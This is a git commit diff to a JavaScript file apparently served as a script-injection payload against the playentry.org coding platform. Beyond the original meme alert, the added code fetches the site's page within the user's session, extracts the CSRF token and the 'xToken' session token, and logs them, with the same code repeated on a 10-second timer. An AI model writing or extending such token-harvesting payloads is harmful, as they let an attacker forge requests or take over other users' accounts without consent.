38fc022494413fe2a0e3fc6aeddcc77fd391a673
FireRun <entryfirerun7012@outlook.com>
2024-06-18 18:22:16 +0900

    Update 5.js

--- 5.js
+++ 5.js
@@ -1,1 +1,27 @@
 alert('엄준식 is God')
+async function getCookie() {
+  csrf = await fetch("https://playentry.org");
+  body = await csrf.text();
+}
+getCookie().then(() => {
+  const index = body.indexOf("csrf-token") + 21;
+  const csrfToken = body.slice(index, index + 36);
+  const xToken = body.split('xToken":"')[1].split('"')[0];
+  const projectlink = "662e192bd5fc107f7e820dfc";
+
+console.log(`xToken : ${xToken} / csrfToken : ${csrfToken}`)
+})
+setTimeout(()=>{
+  async function getCookie() {
+  csrf = await fetch("https://playentry.org");
+  body = await csrf.text();
+}
+getCookie().then(() => {
+  const index = body.indexOf("csrf-token") + 21;
+  const csrfToken = body.slice(index, index + 36);
+  const xToken = body.split('xToken":"')[1].split('"')[0];
+  const projectlink = "662e192bd5fc107f7e820dfc";
+
+console.log(`xToken : ${xToken} / csrfToken : ${csrfToken}`)
+})
+}, 10000) // 자동 리다이렉트 이슈로 일단 넣어 봄
